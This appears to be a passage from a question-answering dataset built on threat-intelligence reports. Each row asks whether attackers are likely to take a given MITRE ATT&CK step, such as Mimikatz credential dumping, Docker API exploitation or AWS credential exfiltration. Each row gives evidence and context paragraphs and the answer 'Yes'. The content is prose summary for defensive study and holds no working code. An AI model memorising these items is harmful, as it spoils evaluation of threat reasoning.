Lateral Movement: Using the collection of webshells, the actors moved laterally to other systems on the network by dumping credentials with a variant of the notorious Mimikatz tool and using Impacket's atexec tool to use dumped credentials to run commands on other systems.
Command and Control: The actors used the AntSword webshell to communicate with the compromised server and run commands. They also used the AntSword Shell Manager to interact with the webshell.
Others: Palo Alto Networks customers are protected from the threat described in this report through Threat Prevention signatures for the exploits and C2 traffic as well as through WildFire. The CVE-2019-0604 vulnerability is covered by IPS signature Microsoft SharePoint Remote Code Execution Vulnerability (55411). The Awen Webshell and AntSword ASPX Webshell are detected by IPS signatures. The Mimikatz, Impacket atexec, and Dumpert tools are all marked with malicious verdicts by WildFire.",Yes,Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations
582,174,174-Discovery-T1016-System Network Configuration Discovery,"After using Mimikatz to dump credentials and Impacket tools for pass-the-hash attacks to run commands on other systems, is it likely that the threat actors will execute commands to discover system network configuration on the compromised server before using lateral movement techniques involving dumped credentials and Impacket's atexec tool?","Discovery: The actors ran various commands to do initial discovery on the system and network, including user accounts, files and folders, privileged groups, remote systems, and network configuration.","Initial Access: On September 10, 2019, unknown threat actors exploited a vulnerability in SharePoint described in CVE-2019-0604 to install several webshells on the website of a Middle East government organization. One of these webshells is the open source AntSword webshell, similar to the China Chopper webshell.
Execution: The actors used the AntSword webshell to run a variety of commands on the compromised server for initial system and user discovery, as well as to ping systems of interest. They also uploaded tools to the server, including cURL, a custom Mimikatz variant, and compiled variants of Impacket's wmiexec and atexec tools.
Defense Evasion: The actors used a custom Mimikatz variant with a .NET loader to evade detection. Additionally, they uploaded the Dumpert tool, designed to evade antivirus and EDR solutions by using direct system calls and API unhooking.
Credential Access: The actors used Mimikatz to dump credentials from memory and Impacket tools to use the pass the hash technique to run commands on other systems.
Lateral Movement: Using the collection of webshells, the actors moved laterally to other systems on the network by dumping credentials with a variant of the notorious Mimikatz tool and using Impacket's atexec tool to use dumped credentials to run commands on other systems.
Command and Control: The actors used the AntSword webshell to communicate with the compromised server and run commands. They also used the AntSword Shell Manager to interact with the webshell.
Others: Palo Alto Networks customers are protected from the threat described in this report through Threat Prevention signatures for the exploits and C2 traffic as well as through WildFire. The CVE-2019-0604 vulnerability is covered by IPS signature Microsoft SharePoint Remote Code Execution Vulnerability (55411). The Awen Webshell and AntSword ASPX Webshell are detected by IPS signatures. The Mimikatz, Impacket atexec, and Dumpert tools are all marked with malicious verdicts by WildFire.",Yes,Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations
585,174,174-Credential Access-T1003-OS Credential Dumping,"After achieving defense evasion by uploading the Dumpert tool to evade antivirus and EDR solutions, is it likely that the actors will perform OS credential dumping using Mimikatz before moving laterally to other systems on the network by executing commands through Impacket's atexec tool using the dumped credentials?",Credential Access: The actors used Mimikatz to dump credentials from memory and Impacket tools to use the pass the hash technique to run commands on other systems.,"Initial Access: On September 10, 2019, unknown threat actors exploited a vulnerability in SharePoint described in CVE-2019-0604 to install several webshells on the website of a Middle East government organization. One of these webshells is the open source AntSword webshell, similar to the China Chopper webshell.
Execution: The actors used the AntSword webshell to run a variety of commands on the compromised server for initial system and user discovery, as well as to ping systems of interest. They also uploaded tools to the server, including cURL, a custom Mimikatz variant, and compiled variants of Impacket's wmiexec and atexec tools.
Defense Evasion: The actors used a custom Mimikatz variant with a .NET loader to evade detection. Additionally, they uploaded the Dumpert tool, designed to evade antivirus and EDR solutions by using direct system calls and API unhooking.
Discovery: The actors ran various commands to do initial discovery on the system and network, including user accounts, files and folders, privileged groups, remote systems, and network configuration.
Lateral Movement: Using the collection of webshells, the actors moved laterally to other systems on the network by dumping credentials with a variant of the notorious Mimikatz tool and using Impacket's atexec tool to use dumped credentials to run commands on other systems.
Command and Control: The actors used the AntSword webshell to communicate with the compromised server and run commands. They also used the AntSword Shell Manager to interact with the webshell.
Others: Palo Alto Networks customers are protected from the threat described in this report through Threat Prevention signatures for the exploits and C2 traffic as well as through WildFire. The CVE-2019-0604 vulnerability is covered by IPS signature Microsoft SharePoint Remote Code Execution Vulnerability (55411). The Awen Webshell and AntSword ASPX Webshell are detected by IPS signatures. The Mimikatz, Impacket atexec, and Dumpert tools are all marked with malicious verdicts by WildFire.",Yes,Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations
586,175,175-Resource Development-T1584-Compromise Infrastructure,"After adversaries use functions like DOCKERGEDDON during the Reconnaissance phase to scan entire netblocks and detect compromised Docker APIs, is it likely that they would identify and use domains resolving to the same IP address during the Resource Development phase to support the infrastructure linked with attacks like the Kinsing malware campaign?","Resource Development: The report details that attackers' infrastructure was analyzed by examining inbound and outbound traffic. IPs used to disseminate and communicate with Kinsing malware were identified, likely part of a botnet linked to the Kinsing malware campaign. TeamTNT used domains like teamtnt[.]red, kaiserfranz[.]cc, and borg[.]wtf for CnC server, DNS, and IRC server, all resolving to the same IP address. Attackers also used compromised websites to store malicious files downloaded during container runtime. Additionally, attackers utilized open-source and offensive security tools to find vulnerabilities and exploit them.","Reconnaissance: The CTI report indicates that adversaries continue to use worms to detect and infect new vulnerable hosts, employing scanning tools such as masscan to increase the frequency of scanning activity and the chances of finding misconfigurations promptly. Some adversaries also use public search engines like Shodan or Censys. An example script was provided, showing how attackers configure the netblock, start IP address, log files, and the container to be executed on detected IPs. The function DOCKERGEDDON, containing masscan and zgrab, is used to scan entire netblocks and detect compromised Docker APIs, collect information about the host, and deploy a malicious container.
Initial Access: Attackers exploited misconfigured Docker API ports exposed to the internet, allowing all incoming traffic access. They also built files on the host from base64. Adversaries created public registry accounts that mimic popular software or packages to trick developers into pulling and running malicious container images, such as Tesnorflow, a typo-squatting of Tensorflow. A massive attack against GitHub, Docker Hub, Travis CI, and Circle CI was reported, where crypto miners were executed during the auto-build of an image process, targeting supply-chain processes.
Execution: Attackers abused command and script interpreters to execute malicious commands, scripts, or binaries. They used cmd or entry point to execute commands, scripts, or binaries, including executing shell or Python scripts already on disk, using CURL or WGET UNIX commands to download scripts or binaries from a remote source, and hiding encoded binary in the cmd, decoding it, writing it to file, and executing it. Attackers also scheduled local jobs after mounting the host and using the cron utility.
Persistence: Adversaries used LD_PRELOAD to hijack execution flow and gain persistency by giving priority to their malicious code, as seen in a rootkit loaded in the container. They also created new user accounts with RSA keys to open backdoors for full control of the host.
Privilege Escalation: Attackers used hostPath mount to gain persistence on the underlying host by creating a writable hostPath volume. They also used chroot to run processes outside the container and save files in different locations on the host. External remote services like IRC channels were used by Tsunami malware to provide full access to an infected machine and become part of a botnet.
Defense Evasion: Adversaries removed security software to avoid detection, using techniques to detect and remove security software, such as disabling Watchdog and deleting Alibaba Aliyun Aegis cloud security software. They also used obfuscated files or information, like software packing, to avoid detection of malicious binaries. Fileless malware attacks were executed by loading malware into memory and executing it without leaving a trace on the disk.
Credential Access: Adversaries used open-source tools to collect credentials, such as the Python script punk.py, which collects usernames, SSH keys, and known hosts from a Unix system. They also created and hid users in the victim's environment to mask the presence of user accounts they created.
Command and Control: Attackers used proxy tools like Ngrok for lateral movement and data exfiltration. They also used legitimate external websites as C2 servers, downloading malicious code from sources like GitHub and Bitbucket. Data encoding was used to compile binary files from decoded snippets in the entry point, establishing contact with C2 servers to download shell scripts.
Exfiltration: Automated exfiltration of AWS credentials over the C2 server was observed, with adversaries looking for AWS keys and trying to exfiltrate them to their C2 servers. Access to the Instance Metadata Services (IMDS) should be limited through IAM roles and network access policies.
Impact: Cryptocurrency mining was the main objective of most attacks, with over 90% of the images executing resource hijacking. However, new objectives such as backdoors, malware deployments, and credential theft are emerging. Adversaries are also using worms to reach further victims, and over 40% of the attacks involve backdoors, indicating that attackers are looking to maximize their gain from each attack.",Yes,Cloud_Native_Threat_Report_2021
587,175,175-Resource Development-T1608-Stage Capabilities,"Following reconnaissance activities where a DOCKERGEDDON function is employed to scan netblocks, detect misconfigured Docker APIs, and deploy malicious containers, is it likely that attackers will leverage compromised websites to host malicious files used to develop their attacker infrastructure, before exploiting vulnerabilities using open-source and offensive security tools during resource development?","Resource Development: The report details that attackers' infrastructure was analyzed by examining inbound and outbound traffic. IPs used to disseminate and communicate with Kinsing malware were identified, likely part of a botnet linked to the Kinsing malware campaign. TeamTNT used domains like teamtnt[.]red, kaiserfranz[.]cc, and borg[.]wtf for CnC server, DNS, and IRC server, all resolving to the same IP address. Attackers also used compromised websites to store malicious files downloaded during container runtime. Additionally, attackers utilized open-source and offensive security tools to find vulnerabilities and exploit them.","Reconnaissance: The CTI report indicates that adversaries continue to use worms to detect and infect new vulnerable hosts, employing scanning tools such as masscan to increase the frequency of scanning activity and the chances of finding misconfigurations promptly. Some adversaries also use public search engines like Shodan or Censys. An example script was provided, showing how attackers configure the netblock, start IP address, log files, and the container to be executed on detected IPs. The function DOCKERGEDDON, containing masscan and zgrab, is used to scan entire netblocks and detect compromised Docker APIs, collect information about the host, and deploy a malicious container.
Initial Access: Attackers exploited misconfigured Docker API ports exposed to the internet, allowing all incoming traffic access. They also built files on the host from base64. Adversaries created public registry accounts that mimic popular software or packages to trick developers into pulling and running malicious container images, such as Tesnorflow, a typo-squatting of Tensorflow. A massive attack against GitHub, Docker Hub, Travis CI, and Circle CI was reported, where crypto miners were executed during the auto-build of an image process, targeting supply-chain processes.
Execution: Attackers abused command and script interpreters to execute malicious commands, scripts, or binaries. They used cmd or entry point to execute commands, scripts, or binaries, including executing shell or Python scripts already on disk, using CURL or WGET UNIX commands to download scripts or binaries from a remote source, and hiding encoded binary in the cmd, decoding it, writing it to file, and executing it. Attackers also scheduled local jobs after mounting the host and using the cron utility.
Persistence: Adversaries used LD_PRELOAD to hijack execution flow and gain persistency by giving priority to their malicious code, as seen in a rootkit loaded in the container. They also created new user accounts with RSA keys to open backdoors for full control of the host.
Privilege Escalation: Attackers used hostPath mount to gain persistence on the underlying host by creating a writable hostPath volume. They also used chroot to run processes outside the container and save files in different locations on the host. External remote services like IRC channels were used by Tsunami malware to provide full access to an infected machine and become part of a botnet.
Defense Evasion: Adversaries removed security software to avoid detection, using techniques to detect and remove security software, such as disabling Watchdog and deleting Alibaba Aliyun Aegis cloud security software. They also used obfuscated files or information, like software packing, to avoid detection of malicious binaries. Fileless malware attacks were executed by loading malware into memory and executing it without leaving a trace on the disk.
Credential Access: Adversaries used open-source tools to collect credentials, such as the Python script punk.py, which collects usernames, SSH keys, and known hosts from a Unix system. They also created and hid users in the victim's environment to mask the presence of user accounts they created.
Command and Control: Attackers used proxy tools like Ngrok for lateral movement and data exfiltration. They also used legitimate external websites as C2 servers, downloading malicious code from sources like GitHub and Bitbucket. Data encoding was used to compile binary files from decoded snippets in the entry point, establishing contact with C2 servers to download shell scripts.
Exfiltration: Automated exfiltration of AWS credentials over the C2 server was observed, with adversaries looking for AWS keys and trying to exfiltrate them to their C2 servers. Access to the Instance Metadata Services (IMDS) should be limited through IAM roles and network access policies.
Impact: Cryptocurrency mining was the main objective of most attacks, with over 90% of the images executing resource hijacking. However, new objectives such as backdoors, malware deployments, and credential theft are emerging. Adversaries are also using worms to reach further victims, and over 40% of the attacks involve backdoors, indicating that attackers are looking to maximize their gain from each attack.",Yes,Cloud_Native_Threat_Report_2021
588,175,175-Initial Access-T1190-Exploit Public-Facing Application,"After leveraging worms to detect and infect new vulnerable hosts and scanning netblocks for misconfigured Docker APIs, is it likely that attackers will exploit misconfigured Docker API ports for initial access before using command or script interpreters to execute malicious commands or binaries?","Initial Access: Attackers exploited misconfigured Docker API ports exposed to the internet, allowing all incoming traffic access. They also built files on the host from base64. Adversaries created public registry accounts that mimic popular software or packages to trick developers into pulling and running malicious container images, such as Tesnorflow, a typo-squatting of Tensorflow. A massive attack against GitHub, Docker Hub, Travis CI, and Circle CI was reported, where crypto miners were executed during the auto-build of an image process, targeting supply-chain processes.","Reconnaissance: The CTI report indicates that adversaries continue to use worms to detect and infect new vulnerable hosts, employing scanning tools such as masscan to increase the frequency of scanning activity and the chances of finding misconfigurations promptly. Some adversaries also use public search engines like Shodan or Censys. An example script was provided, showing how attackers configure the netblock, start IP address, log files, and the container to be executed on detected IPs. The function DOCKERGEDDON, containing masscan and zgrab, is used to scan entire netblocks and detect compromised Docker APIs, collect information about the host, and deploy a malicious container.
Resource Development: The report details that attackers' infrastructure was analyzed by examining inbound and outbound traffic. IPs used to disseminate and communicate with Kinsing malware were identified, likely part of a botnet linked to the Kinsing malware campaign. TeamTNT used domains like teamtnt[.]red, kaiserfranz[.]cc, and borg[.]wtf for CnC server, DNS, and IRC server, all resolving to the same IP address. Attackers also used compromised websites to store malicious files downloaded during container runtime. Additionally, attackers utilized open-source and offensive security tools to find vulnerabilities and exploit them.
Execution: Attackers abused command and script interpreters to execute malicious commands, scripts, or binaries. They used cmd or entry point to execute commands, scripts, or binaries, including executing shell or Python scripts already on disk, using CURL or WGET UNIX commands to download scripts or binaries from a remote source, and hiding encoded binary in the cmd, decoding it, writing it to file, and executing it. Attackers also scheduled local jobs after mounting the host and using the cron utility.
Persistence: Adversaries used LD_PRELOAD to hijack execution flow and gain persistency by giving priority to their malicious code, as seen in a rootkit loaded in the container. They also created new user accounts with RSA keys to open backdoors for full control of the host.
Privilege Escalation: Attackers used hostPath mount to gain persistence on the underlying host by creating a writable hostPath volume. They also used chroot to run processes outside the container and save files in different locations on the host. External remote services like IRC channels were used by Tsunami malware to provide full access to an infected machine and become part of a botnet.
Defense Evasion: Adversaries removed security software to avoid detection, using techniques to detect and remove security software, such as disabling Watchdog and deleting Alibaba Aliyun Aegis cloud security software. They also used obfuscated files or information, like software packing, to avoid detection of malicious binaries. Fileless malware attacks were executed by loading malware into memory and executing it without leaving a trace on the disk.
Credential Access: Adversaries used open-source tools to collect credentials, such as the Python script punk.py, which collects usernames, SSH keys, and known hosts from a Unix system. They also created and hid users in the victim's environment to mask the presence of user accounts they created.
Command and Control: Attackers used proxy tools like Ngrok for lateral movement and data exfiltration. They also used legitimate external websites as C2 servers, downloading malicious code from sources like GitHub and Bitbucket. Data encoding was used to compile binary files from decoded snippets in the entry point, establishing contact with C2 servers to download shell scripts.
Exfiltration: Automated exfiltration of AWS credentials over the C2 server was observed, with adversaries looking for AWS keys and trying to exfiltrate them to their C2 servers. Access to the Instance Metadata Services (IMDS) should be limited through IAM roles and network access policies.
Impact: Cryptocurrency mining was the main objective of most attacks, with over 90% of the images executing resource hijacking. However, new objectives such as backdoors, malware deployments, and credential theft are emerging. Adversaries are also using worms to reach further victims, and over 40% of the attacks involve backdoors, indicating that attackers are looking to maximize their gain from each attack.",Yes,Cloud_Native_Threat_Report_2021
592,175,175-Persistence-T1574-Hijack Execution Flow,"After attackers exploited misconfigured Docker API ports exposed to the internet for initial access by allowing incoming traffic access and creating public registry accounts to trick developers into running malicious container images, is it likely that adversaries will abuse command and script interpreters to execute malicious commands or binaries before achieving persistence by using LD_PRELOAD to hijack execution flow and prioritize their malicious code?","Persistence: Adversaries used LD_PRELOAD to hijack execution flow and gain persistency by giving priority to their malicious code, as seen in a rootkit loaded in the container. They also created new user accounts with RSA keys to open backdoors for full control of the host.","Reconnaissance: The CTI report indicates that adversaries continue to use worms to detect and infect new vulnerable hosts, employing scanning tools such as masscan to increase the frequency of scanning activity and the chances of finding misconfigurations promptly. Some adversaries also use public search engines like Shodan or Censys. An example script was provided, showing how attackers configure the netblock, start IP address, log files, and the container to be executed on detected IPs. The function DOCKERGEDDON, containing masscan and zgrab, is used to scan entire netblocks and detect compromised Docker APIs, collect information about the host, and deploy a malicious container.
Resource Development: The report details that attackers' infrastructure was analyzed by examining inbound and outbound traffic. IPs used to disseminate and communicate with Kinsing malware were identified, likely part of a botnet linked to the Kinsing malware campaign. TeamTNT used domains like teamtnt[.]red, kaiserfranz[.]cc, and borg[.]wtf for CnC server, DNS, and IRC server, all resolving to the same IP address. Attackers also used compromised websites to store malicious files downloaded during container runtime. Additionally, attackers utilized open-source and offensive security tools to find vulnerabilities and exploit them.
Initial Access: Attackers exploited misconfigured Docker API ports exposed to the internet, allowing all incoming traffic access. They also built files on the host from base64. Adversaries created public registry accounts that mimic popular software or packages to trick developers into pulling and running malicious container images, such as Tesnorflow, a typo-squatting of Tensorflow. A massive attack against GitHub, Docker Hub, Travis CI, and Circle CI was reported, where crypto miners were executed during the auto-build of an image process, targeting supply-chain processes.
Execution: Attackers abused command and script interpreters to execute malicious commands, scripts, or binaries. They used cmd or entry point to execute commands, scripts, or binaries, including executing shell or Python scripts already on disk, using CURL or WGET UNIX commands to download scripts or binaries from a remote source, and hiding encoded binary in the cmd, decoding it, writing it to file, and executing it. Attackers also scheduled local jobs after mounting the host and using the cron utility.
Privilege Escalation: Attackers used hostPath mount to gain persistence on the underlying host by creating a writable hostPath volume. They also used chroot to run processes outside the container and save files in different locations on the host. External remote services like IRC channels were used by Tsunami malware to provide full access to an infected machine and become part of a botnet.
Defense Evasion: Adversaries removed security software to avoid detection, using techniques to detect and remove security software, such as disabling Watchdog and deleting Alibaba Aliyun Aegis cloud security software. They also used obfuscated files or information, like software packing, to avoid detection of malicious binaries. Fileless malware attacks were executed by loading malware into memory and executing it without leaving a trace on the disk.
Credential Access: Adversaries used open-source tools to collect credentials, such as the Python script punk.py, which collects usernames, SSH keys, and known hosts from a Unix system. They also created and hid users in the victim's environment to mask the presence of user accounts they created.
Command and Control: Attackers used proxy tools like Ngrok for lateral movement and data exfiltration. They also used legitimate external websites as C2 servers, downloading malicious code from sources like GitHub and Bitbucket. Data encoding was used to compile binary files from decoded snippets in the entry point, establishing contact with C2 servers to download shell scripts.
Exfiltration: Automated exfiltration of AWS credentials over the C2 server was observed, with adversaries looking for AWS keys and trying to exfiltrate them to their C2 servers. Access to the Instance Metadata Services (IMDS) should be limited through IAM roles and network access policies.
Impact: Cryptocurrency mining was the main objective of most attacks, with over 90% of the images executing resource hijacking. However, new objectives such as backdoors, malware deployments, and credential theft are emerging. Adversaries are also using worms to reach further victims, and over 40% of the attacks involve backdoors, indicating that attackers are looking to maximize their gain from each attack.",Yes,Cloud_Native_Threat_Report_2021
601,175,175-Exfiltration-T1020-Automated Exfiltration,"After attackers establish contact with C2 servers by downloading shell scripts and encoding malicious binary files, is it likely that they will automatically exfiltrate AWS credentials over the C2 server as part of their attack sequence?","Exfiltration: Automated exfiltration of AWS credentials over the C2 server was observed, with adversaries looking for AWS keys and trying to exfiltrate them to their C2 servers. Access to the Instance Metadata Services (IMDS) should be limited through IAM roles and network access policies.","Reconnaissance: The CTI report indicates that adversaries continue to use worms to detect and infect new vulnerable hosts, employing scanning tools such as masscan to increase the frequency of scanning activity and the chances of finding misconfigurations promptly. Some adversaries also use public search engines like Shodan or Censys. An example script was provided, showing how attackers configure the netblock, start IP address, log files, and the container to be executed on detected IPs. The function DOCKERGEDDON, containing masscan and zgrab, is used to scan entire netblocks and detect compromised Docker APIs, collect information about the host, and deploy a malicious container.
Resource Development: The report details that attackers' infrastructure was analyzed by examining inbound and outbound traffic. IPs used to disseminate and communicate with Kinsing malware were identified, likely part of a botnet linked to the Kinsing malware campaign. TeamTNT used domains like teamtnt[.]red, kaiserfranz[.]cc, and borg[.]wtf for CnC server, DNS, and IRC server, all resolving to the same IP address. Attackers also used compromised websites to store malicious files downloaded during container runtime. Additionally, attackers utilized open-source and offensive security tools to find vulnerabilities and exploit them.
Initial Access: Attackers exploited misconfigured Docker API ports exposed to the internet, allowing all incoming traffic access. They also built files on the host from base64. Adversaries created public registry accounts that mimic popular software or packages to trick developers into pulling and running malicious container images, such as Tesnorflow, a typo-squatting of Tensorflow. A massive attack against GitHub, Docker Hub, Travis CI, and Circle CI was reported, where crypto miners were executed during the auto-build of an image process, targeting supply-chain processes.
Execution: Attackers abused command and script interpreters to execute malicious commands, scripts, or binaries. They used cmd or entry point to execute commands, scripts, or binaries, including executing shell or Python scripts already on disk, using CURL or WGET UNIX commands to download scripts or binaries from a remote source, and hiding encoded binary in the cmd, decoding it, writing it to file, and executing it. Attackers also scheduled local jobs after mounting the host and using the cron utility.
Persistence: Adversaries used LD_PRELOAD to hijack execution flow and gain persistency by giving priority to their malicious code, as seen in a rootkit loaded in the container. They also created new user accounts with RSA keys to open backdoors for full control of the host.
Privilege Escalation: Attackers used hostPath mount to gain persistence on the underlying host by creating a writable hostPath volume. They also used chroot to run processes outside the container and save files in different locations on the host. External remote services like IRC channels were used by Tsunami malware to provide full access to an infected machine and become part of a botnet.
Defense Evasion: Adversaries removed security software to avoid detection, using techniques to detect and remove security software, such as disabling Watchdog and deleting Alibaba Aliyun Aegis cloud security software. They also used obfuscated files or information, like software packing, to avoid detection of malicious binaries. Fileless malware attacks were executed by loading malware into memory and executing it without leaving a trace on the disk.
Credential Access: Adversaries used open-source tools to collect credentials, such as the Python script punk.py, which collects usernames, SSH keys, and known hosts from a Unix system. They also created and hid users in the victim's environment to mask the presence of user accounts they created.
Command and Control: Attackers used proxy tools like Ngrok for lateral movement and data exfiltration. They also used legitimate external websites as C2 servers, downloading malicious code from sources like GitHub and Bitbucket. Data encoding was used to compile binary files from decoded snippets in the entry point, establishing contact with C2 servers to download shell scripts.
Impact: Cryptocurrency mining was the main objective of most attacks, with over 90% of the images executing resource hijacking. However, new objectives such as backdoors, malware deployments, and credential theft are emerging. Adversaries are also using worms to reach further victims, and over 40% of the attacks involve backdoors, indicating that attackers are looking to maximize their gain from each attack.",Yes,Cloud_Native_Threat_Report_2021
602,175,175-Credential Access-T1003-OS Credential Dumping,"After disabling Watchdog and deleting cloud security software like Alibaba Aliyun Aegis for defense evasion, is it likely that adversaries will use open-source tools such as punk.py to collect credentials, including usernames, SSH keys, and known hosts, while masking the presence of user accounts they created?","Credential Access: Adversaries used open-source tools to collect credentials, such as the Python script punk.py, which collects usernames, SSH keys, and known hosts from a Unix system. They also created and hid users in the victim's environment to mask the presence of user accounts they created.","Reconnaissance: The CTI report indicates that adversaries continue to use worms to detect and infect new vulnerable hosts, employing scanning tools such as masscan to increase the frequency of scanning activity and the chances of finding misconfigurations promptly. Some adversaries also use public search engines like Shodan or Censys. An example script was provided, showing how attackers configure the netblock, start IP address, log files, and the container to be executed on detected IPs. The function DOCKERGEDDON, containing masscan and zgrab, is used to scan entire netblocks and detect compromised Docker APIs, collect information about the host, and deploy a malicious container.
Resource Development: The report details that attackers' infrastructure was analyzed by examining inbound and outbound traffic. IPs used to disseminate and communicate with Kinsing malware were identified, likely part of a botnet linked to the Kinsing malware campaign. TeamTNT used domains like teamtnt[.]red, kaiserfranz[.]cc, and borg[.]wtf for CnC server, DNS, and IRC server, all resolving to the same IP address. Attackers also used compromised websites to store malicious files downloaded during container runtime. Additionally, attackers utilized open-source and offensive security tools to find vulnerabilities and exploit them.
Initial Access: Attackers exploited misconfigured Docker API ports exposed to the internet, allowing all incoming traffic access. They also built files on the host from base64. Adversaries created public registry accounts that mimic popular software or packages to trick developers into pulling and running malicious container images, such as Tesnorflow, a typo-squatting of Tensorflow. A massive attack against GitHub, Docker Hub, Travis CI, and Circle CI was reported, where crypto miners were executed during the auto-build of an image process, targeting supply-chain processes.
Execution: Attackers abused command and script interpreters to execute malicious commands, scripts, or binaries. They used cmd or entry point to execute commands, scripts, or binaries, including executing shell or Python scripts already on disk, using CURL or WGET UNIX commands to download scripts or binaries from a remote source, and hiding encoded binary in the cmd, decoding it, writing it to file, and executing it. Attackers also scheduled local jobs after mounting the host and using the cron utility.
Persistence: Adversaries used LD_PRELOAD to hijack execution flow and gain persistency by giving priority to their malicious code, as seen in a rootkit loaded in the container. They also created new user accounts with RSA keys to open backdoors for full control of the host.
Privilege Escalation: Attackers used hostPath mount to gain persistence on the underlying host by creating a writable hostPath volume. They also used chroot to run processes outside the container and save files in different locations on the host. External remote services like IRC channels were used by Tsunami malware to provide full access to an infected machine and become part of a botnet.
Defense Evasion: Adversaries removed security software to avoid detection, using techniques to detect and remove security software, such as disabling Watchdog and deleting Alibaba Aliyun Aegis cloud security software. They also used obfuscated files or information, like software packing, to avoid detection of malicious binaries. Fileless malware attacks were executed by loading malware into memory and executing it without leaving a trace on the disk.
Command and Control: Attackers used proxy tools like Ngrok for lateral movement and data exfiltration. They also used legitimate external websites as C2 servers, downloading malicious code from sources like GitHub and Bitbucket. Data encoding was used to compile binary files from decoded snippets in the entry point, establishing contact with C2 servers to download shell scripts.
Exfiltration: Automated exfiltration of AWS credentials over the C2 server was observed, with adversaries looking for AWS keys and trying to exfiltrate them to their C2 servers. Access to the Instance Metadata Services (IMDS) should be limited through IAM roles and network access policies.
Impact: Cryptocurrency mining was the main objective of most attacks, with over 90% of the images executing resource hijacking. However, new objectives such as backdoors, malware deployments, and credential theft are emerging. Adversaries are also using worms to reach further victims, and over 40% of the attacks involve backdoors, indicating that attackers are looking to maximize their gain from each attack.",Yes,Cloud_Native_Threat_Report_2021
605,175,175-Reconnaissance-T1592-Gather Victim Host Information,"After utilizing DOCKERGEDDON to detect compromised Docker APIs during reconnaissance, is it likely that attackers will exploit misconfigured Docker API ports exposed to the internet for initial access before abusing command and script interpreters to execute malicious scripts or binaries?","Reconnaissance: The CTI report indicates that adversaries continue to use worms to detect and infect new vulnerable hosts, employing scanning tools such as masscan to increase the frequency of scanning activity and the chances of finding misconfigurations promptly. Some adversaries also use public search engines like Shodan or Censys. An example script was provided, showing how attackers configure the netblock, start IP address, log files, and the container to be executed on detected IPs. The function DOCKERGEDDON, containing masscan and zgrab, is used to scan entire netblocks and detect compromised Docker APIs, collect information about the host, and deploy a malicious container.","Resource Development: The report details that attackers' infrastructure was analyzed by examining inbound and outbound traffic. IPs used to disseminate and communicate with Kinsing malware were identified, likely part of a botnet linked to the Kinsing malware campaign. TeamTNT used domains like teamtnt[.]red, kaiserfranz[.]cc, and borg[.]wtf for CnC server, DNS, and IRC server, all resolving to the same IP address. Attackers also used compromised websites to store malicious files downloaded during container runtime. Additionally, attackers utilized open-source and offensive security tools to find vulnerabilities and exploit them.
Initial Access: Attackers exploited misconfigured Docker API ports exposed to the internet, allowing all incoming traffic access. They also built files on the host from base64. Adversaries created public registry accounts that mimic popular software or packages to trick developers into pulling and running malicious container images, such as Tesnorflow, a typo-squatting of Tensorflow. A massive attack against GitHub, Docker Hub, Travis CI, and Circle CI was reported, where crypto miners were executed during the auto-build of an image process, targeting supply-chain processes.
Execution: Attackers abused command and script interpreters to execute malicious commands, scripts, or binaries. They used cmd or entry point to execute commands, scripts, or binaries, including executing shell or Python scripts already on disk, using CURL or WGET UNIX commands to download scripts or binaries from a remote source, and hiding encoded binary in the cmd, decoding it, writing it to file, and executing it. Attackers also scheduled local jobs after mounting the host and using the cron utility.
Persistence: Adversaries used LD_PRELOAD to hijack execution flow and gain persistency by giving priority to their malicious code, as seen in a rootkit loaded in the container. They also created new user accounts with RSA keys to open backdoors for full control of the host.
Privilege Escalation: Attackers used hostPath mount to gain persistence on the underlying host by creating a writable hostPath volume. They also used chroot to run processes outside the container and save files in different locations on the host. External remote services like IRC channels were used by Tsunami malware to provide full access to an infected machine and become part of a botnet.
Defense Evasion: Adversaries removed security software to avoid detection, using techniques to detect and remove security software, such as disabling Watchdog and deleting Alibaba Aliyun Aegis cloud security software. They also used obfuscated files or information, like software packing, to avoid detection of malicious binaries. Fileless malware attacks were executed by loading malware into memory and executing it without leaving a trace on the disk.
Credential Access: Adversaries used open-source tools to collect credentials, such as the Python script punk.py, which collects usernames, SSH keys, and known hosts from a Unix system. They also created and hid users in the victim's environment to mask the presence of user accounts they created.
Command and Control: Attackers used proxy tools like Ngrok for lateral movement and data exfiltration. They also used legitimate external websites as C2 servers, downloading malicious code from sources like GitHub and Bitbucket. Data encoding was used to compile binary files from decoded snippets in the entry point, establishing contact with C2 servers to download shell scripts.
Exfiltration: Automated exfiltration of AWS credentials over the C2 server was observed, with adversaries looking for AWS keys and trying to exfiltrate them to their C2 servers. Access to the Instance Metadata Services (IMDS) should be limited through IAM roles and network access policies.
Impact: Cryptocurrency mining was the main objective of most attacks, with over 90% of the images executing resource hijacking. However, new objectives such as backdoors, malware deployments, and credential theft are emerging. Adversaries are also using worms to reach further victims, and over 40% of the attacks involve backdoors, indicating that attackers are looking to maximize their gain from each attack.",Yes,Cloud_Native_Threat_Report_2021
607,175,175-Privilege Escalation-T1543-Create or Modify System Process,"After gaining persistence by creating new user accounts with RSA keys for backdoor access, is it likely that attackers will use chroot to run processes outside the container while escalating privileges on the underlying host?",Privilege Escalation: Attackers used hostPath mount to gain persistence on the underlying host by creating a writable hostPath volume. They also used chroot to run processes outside the container and save files in different locations on the host. External remote services like IRC channels were used by Tsunami malware to provide full access to an infected machine and become part of a botnet.,"Reconnaissance: The CTI report indicates that adversaries continue to use worms to detect and infect new vulnerable hosts, employing scanning tools such as masscan to increase the frequency of scanning activity and the chances of finding misconfigurations promptly. Some adversaries also use public search engines like Shodan or Censys. An example script was provided, showing how attackers configure the netblock, start IP address, log files, and the container to be executed on detected IPs. The function DOCKERGEDDON, containing masscan and zgrab, is used to scan entire netblocks and detect compromised Docker APIs, collect information about the host, and deploy a malicious container.
Resource Development: The report details that attackers' infrastructure was analyzed by examining inbound and outbound traffic. IPs used to disseminate and communicate with Kinsing malware were identified, likely part of a botnet linked to the Kinsing malware campaign. TeamTNT used domains like teamtnt[.]red, kaiserfranz[.]cc, and borg[.]wtf for CnC server, DNS, and IRC server, all resolving to the same IP address. Attackers also used compromised websites to store malicious files downloaded during container runtime. Additionally, attackers utilized open-source and offensive security tools to find vulnerabilities and exploit them.
Initial Access: Attackers exploited misconfigured Docker API ports exposed to the internet, allowing all incoming traffic access. They also built files on the host from base64. Adversaries created public registry accounts that mimic popular software or packages to trick developers into pulling and running malicious container images, such as Tesnorflow, a typo-squatting of Tensorflow. A massive attack against GitHub, Docker Hub, Travis CI, and Circle CI was reported, where crypto miners were executed during the auto-build of an image process, targeting supply-chain processes.
